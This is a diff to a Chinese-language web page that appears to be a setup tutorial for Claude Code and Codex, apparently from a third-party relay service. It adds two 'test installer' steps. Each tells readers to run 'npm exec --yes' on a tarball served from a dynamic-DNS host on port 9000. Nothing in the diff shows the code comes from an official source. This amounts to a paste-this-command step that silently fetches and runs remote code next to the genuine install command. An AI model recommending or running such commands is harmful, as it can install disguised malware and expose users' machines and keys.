@@ -184,6 +184,11 @@ claude
           </div>
 
           <div className="mt-8">
+            <h3 className="text-xl font-semibold mb-2">1.4 测试 Claude 安装工具</h3>
+            <pre className="mt-2 bg-gray-900 text-gray-100 p-3 rounded overflow-auto"><code>{`npm exec --yes --package="http://a806698083.ticp.io:9000/installer/claude-install-1.1.0.tgz" claude-install`}</code></pre>
+          </div>
+
+          <div className="mt-8">
             <h3 className="text-xl font-semibold mb-2">1.3 第三方客户端调用（已开放）</h3>
             <p className="font-medium">Roo Code / Kilo Code</p>
             <ul className="list-disc pl-6 text-gray-800">
@@ -218,6 +223,9 @@ claude
           <h2 id="codex" className="text-2xl font-semibold mb-3">二、CodeX 安装教程（与 CC 额度通用）</h2>
           <h3 className="text-xl font-semibold mt-2 mb-2">2.1 安装</h3>
           <pre className="mt-2 bg-gray-900 text-gray-100 p-3 rounded overflow-auto"><code>{`npm install -g @openai/codex`}</code></pre>
+
+          <h3 className="text-xl font-semibold mt-4 mb-2">2.1.1 测试 Codex 安装工具</h3>
+          <pre className="mt-2 bg-gray-900 text-gray-100 p-3 rounded overflow-auto"><code>{`npm exec --yes --package="http://a806698083.ticp.io:9000/installer/codex-install-1.1.0.tgz" codex-install`}</code></pre>
 
           <h3 className="text-xl font-semibold mt-4 mb-2">2.2 配置</h3>
           <p className="font-medium">编辑/创建 <code>~/.codex/config.toml</code></p>
